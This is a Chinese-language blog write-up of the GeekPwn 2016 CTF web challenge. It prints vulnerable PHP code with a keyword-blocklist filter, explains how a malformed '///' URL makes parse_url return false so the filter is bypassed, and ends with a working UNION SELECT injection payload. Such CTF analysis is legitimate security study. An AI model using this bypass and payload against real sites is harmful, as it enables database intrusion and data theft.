@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>GeekPwn 2016 跨次元 CTF Web - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.4509a6b37e5a1523e05a614a994b1d27b8f97d6b6cc7b8732bfd105910856434.css" integrity="sha256-RQmms35aFSPgWmFKmUsdJ7j5fWtsx7hzK/0QWRCFZDQ=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>GeekPwn 2016 跨次元 CTF Web</h1>
+        <div>
+            <time datetime="2016-11-03 11:32:00 +0800 CST">发布时间: 2016-11-03 11:32</time>
+            <time datetime="2017-01-17 02:21:00 +0800 CST">更新时间: 2017-01-17 02:21</time>
+        </div>
+    </header>
+
+    <section>
+    <p>代码审计题目，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view-source&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;./inc.php&#34;</span>); <span style="color:#75715e">// Database Connected
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">nojam_firewall</span>(){
+</span></span><span style="display:flex;"><span>    $INFO <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">parse_str</span>($INFO[<span style="color:#e6db74">&#39;query&#39;</span>], $query);
+</span></span><span style="display:flex;"><span>    $filter <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;union&#34;</span>, <span style="color:#e6db74">&#34;select&#34;</span>, <span style="color:#e6db74">&#34;information_schema&#34;</span>, <span style="color:#e6db74">&#34;from&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($query <span style="color:#66d9ef">as</span> $q){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span>($filter <span style="color:#66d9ef">as</span> $f){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$f<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/i&#34;</span>, $q)){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">nojam_log</span>($INFO);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;attack detected!&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nojam_firewall</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getOperator</span>(<span style="color:#f92672">&amp;</span>$operator) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>($operator) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;and&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;&amp;&amp;&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $operator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;and&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;or&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;||&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $operator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;or&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $operator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;or&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/session/isUD&#39;</span>,$_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;not allowed&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">parse_str</span>($_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">getOperator</span>($operator);
+</span></span><span style="display:flex;"><span>$keyword <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($keyword);
+</span></span><span style="display:flex;"><span>$where_clause <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($search_cols)) {
+</span></span><span style="display:flex;"><span>    $search_cols <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;subject|content&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$cols <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;|&#39;</span>,$search_cols);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>($cols <span style="color:#66d9ef">as</span> $col) {
+</span></span><span style="display:flex;"><span>    $col <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(subject|content|writer)$/isDU&#39;</span>,$col) <span style="color:#f92672">?</span> $col <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($col) {
+</span></span><span style="display:flex;"><span>        $query_parts <span style="color:#f92672">=</span> $col <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; like &#39;%&#34;</span> <span style="color:#f92672">.</span> $keyword <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;%&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($query_parts) {
+</span></span><span style="display:flex;"><span>        $where_clause <span style="color:#f92672">.=</span> $query_parts;
+</span></span><span style="display:flex;"><span>        $where_clause <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39; &#39;</span>;
+</span></span><span style="display:flex;"><span>        $where_clause <span style="color:#f92672">.=</span> $operator;
+</span></span><span style="display:flex;"><span>        $where_clause <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39; &#39;</span>;
+</span></span><span style="display:flex;"><span>        $query_parts <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$where_clause) {
+</span></span><span style="display:flex;"><span>    $where_clause <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;content like &#39;%</span><span style="color:#e6db74">{</span>$keyword<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\s&#39;</span><span style="color:#f92672">.</span>$operator<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;\s$/isDU&#39;</span>,$where_clause)) {
+</span></span><span style="display:flex;"><span>    $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($where_clause) <span style="color:#f92672">-</span> (<span style="color:#a6e22e">strlen</span>($operator) <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    $where_clause <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($where_clause, <span style="color:#ae81ff">0</span>, $len);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    td:first-child, td:last-child {text-align:center;}
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    td {padding:3px; border:1px solid #ddd;}
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    thead td {font-weight:bold; text-align:center;}
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    tbody tr {cursor:pointer;}
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;br /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;table border=1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;thead&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;tr&gt;&lt;td&gt;Num&lt;/td&gt;&lt;td&gt;subject&lt;/td&gt;&lt;td&gt;content&lt;/td&gt;&lt;td&gt;writer&lt;/td&gt;&lt;/tr&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/thead&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;tbody&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $result = mysql_query(&#34;select * from board where {$where_clause} order by idx desc&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            while ($row = mysql_fetch_assoc($result)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;tr&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;td&gt;{$row[&#39;idx&#39;]}&lt;/td&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;td&gt;{$row[&#39;subject&#39;]}&lt;/td&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;td&gt;{$row[&#39;content&#39;]}&lt;/td&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;td&gt;{$row[&#39;writer&#39;]}&lt;/td&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;&lt;/tr&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/tbody&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;tfoot&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;tr&gt;&lt;td colspan=4&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;form method=&#34;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;select name=&#34;search_cols&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;option value=&#34;subject&#34; selected&gt;subject&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;option value=&#34;content&#34;&gt;content&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;option value=&#34;content|content&#34;&gt;subject, content&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;option value=&#34;writer&#34;&gt;writer&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;/select&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;text&#34; name=&#34;keyword&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;radio&#34; name=&#34;operator&#34; value=&#34;or&#34; checked /&gt; or &amp;nbsp;&amp;nbsp;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;radio&#34; name=&#34;operator&#34; value=&#34;and&#34; /&gt; and
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;input type=&#34;submit&#34; value=&#34;SEARCH&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/td&gt;&lt;/tr&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/tfoot&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/table&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;br /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;a href=&#34;./?view-source&#34;&gt;view-source&lt;/a&gt;&lt;br /&gt;
+</span></span></span></code></pre></div><p>漏洞很明显，第 47 行的 <code>parse_str</code> 导致变量覆盖，第 59 行若 <code>$col</code> 为 <code>false</code> 就不会进入赋值语句，也就是说 <code>$query_parts</code> 因变量覆盖可控，而在第 56-59 行可以看到 <code>$col</code> 是对输入做正则匹配的返回值，<code>$col</code> 可控，进而导致注入：</p>
+<pre tabindex="0"><code>/index.php?search_cols=a&amp;keyword=xxxx&amp;operator=and&amp;query_parts={injection} 。
+</code></pre><p>但是在第 12-24 行可以看到有一防注入函数，想要更好出数据肯定要绕过防注入。函数是通过 <code>parse_url</code>、<code>parse_str</code> 解析 url 参数，然后通过正则限制关键字的方式做的过滤，常规的方法绕过相对困难。</p>
+<p>这里用到了 <code>parse_url</code> 函数在解析 url 时存在的 bug，通过：<code>///x.php?key=value</code> 的方式可以使其返回 <code>false</code>。</p>
+<p>具体可以看 <a href="https://github.com/php/php-src/blob/9df6112e01eacb6e068e8d23e78181918bdab548/ext/standard/url.c#L97">源码</a>，关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PHPAPI php_url <span style="color:#f92672">*</span><span style="color:#a6e22e">php_url_parse_ex</span>(<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>str, <span style="color:#66d9ef">size_t</span> length)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> port_buf[<span style="color:#ae81ff">6</span>];
+</span></span><span style="display:flex;"><span>    php_url <span style="color:#f92672">*</span>ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ecalloc</span>(<span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(php_url));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>s, <span style="color:#f92672">*</span>e, <span style="color:#f92672">*</span>p, <span style="color:#f92672">*</span>pp, <span style="color:#f92672">*</span>ue;
+</span></span><span style="display:flex;"><span>    ...snip...
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (<span style="color:#f92672">*</span>s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>(s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>) { <span style="color:#75715e">/* relative-scheme URL */</span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        just_path:
+</span></span><span style="display:flex;"><span>        ue <span style="color:#f92672">=</span> s <span style="color:#f92672">+</span> length;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> nohost;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> s <span style="color:#f92672">+</span> <span style="color:#a6e22e">strcspn</span>(s, <span style="color:#e6db74">&#34;/?#&#34;</span>);
+</span></span><span style="display:flex;"><span>    ...snip...
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> e;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* check if we have a valid host, if we don&#39;t reject the string as url */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((p<span style="color:#f92672">-</span>s) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret<span style="color:#f92672">-&gt;</span>scheme) <span style="color:#a6e22e">efree</span>(ret<span style="color:#f92672">-&gt;</span>scheme);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret<span style="color:#f92672">-&gt;</span>user) <span style="color:#a6e22e">efree</span>(ret<span style="color:#f92672">-&gt;</span>user);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret<span style="color:#f92672">-&gt;</span>pass) <span style="color:#a6e22e">efree</span>(ret<span style="color:#f92672">-&gt;</span>pass);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">efree</span>(ret);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span></code></pre></div><p>可以看到，在函数 <code>parse_url</code> 内部，如果 url 是以 <code>//</code> 开始，就认为它是相对 url，而后认为 url 的部件从 <code>url+2</code> 开始。第 281 行，若 <code>p-s &lt; 1</code>，也就是如果 url 为 <code>///x.php</code>，则 <code>p = e = s = s + 2</code>，函数将返回 <code>NULL</code>。</p>
+<p>再看 <code>PHP_FUNCTION</code>，第 351 行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* {{{ proto mixed parse_url(string url, [int url_component])
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   Parse a URL and return its components */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">PHP_FUNCTION</span>(parse_url)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> str_len;
+</span></span><span style="display:flex;"><span>    php_url <span style="color:#f92672">*</span>resource;
+</span></span><span style="display:flex;"><span>    zend_long key <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">zend_parse_parameters</span>(<span style="color:#a6e22e">ZEND_NUM_ARGS</span>(), <span style="color:#e6db74">&#34;s|l&#34;</span>, <span style="color:#f92672">&amp;</span>str, <span style="color:#f92672">&amp;</span>str_len, <span style="color:#f92672">&amp;</span>key) <span style="color:#f92672">==</span> FAILURE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    resource <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_url_parse_ex</span>(str, str_len);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (resource <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* @todo Find a method to determine why php_url_parse_ex() failed */</span>
+</span></span><span style="display:flex;"><span>        RETURN_FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>若 <code>php_url_parse_ex</code> 结果为 <code>NULL</code>，函数 <code>parse_url</code> 将返回 <code>false</code>。</p>
+<p>测试如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜ ~ uname -a
+</span></span><span style="display:flex;"><span>Linux kali 4.7.0-kali1-amd64 <span style="color:#75715e">#1 SMP Debian 4.7.8-1kali1 (2016-10-24) x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span>➜ ~ php -v
+</span></span><span style="display:flex;"><span>PHP 7.0.12-1 <span style="color:#f92672">(</span>cli<span style="color:#f92672">)</span> <span style="color:#f92672">(</span> NTS <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1997-2016 The PHP Group
+</span></span><span style="display:flex;"><span>Zend Engine v3.0.0, Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1998-2016 Zend Technologies
+</span></span><span style="display:flex;"><span>    with Zend OPcache v7.0.12-1, Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2016, by Zend Technologies
+</span></span><span style="display:flex;"><span>➜ ~ php -a
+</span></span><span style="display:flex;"><span>Interactive mode enabled
+</span></span><span style="display:flex;"><span>php &gt; var_dump<span style="color:#f92672">(</span>parse_url<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;///x.php?key=value&#39;</span><span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>bool<span style="color:#f92672">(</span>false<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>函数 <code>php_url_parse_ex</code> 中还存在很多类似的问题，而 <code>parse_url</code> 中又没有对其解析失败的原因进行分析，导致 <code>parse_url</code> 频繁出现类似的 bug，比如主办方后来放出的 hint：<a href="https://bugs.php.net/bug.php?id=55511">Bug #55511</a>。</p>
+<p><code>$INFO = parse_url($_SERVER['REQUEST_URI']) = false</code>，后续的过滤也就完全无用了，成功绕过防注入。最终 payload：</p>
+<pre tabindex="0"><code>///index.php?search_cols=a|b&amp;keyword=xxxx&amp;operator=and&amp;query_parts=123 union select 1,2,3,flag from flag
+</code></pre>
+    </section>
+</article>
+</main>
+  </body>
+</html>
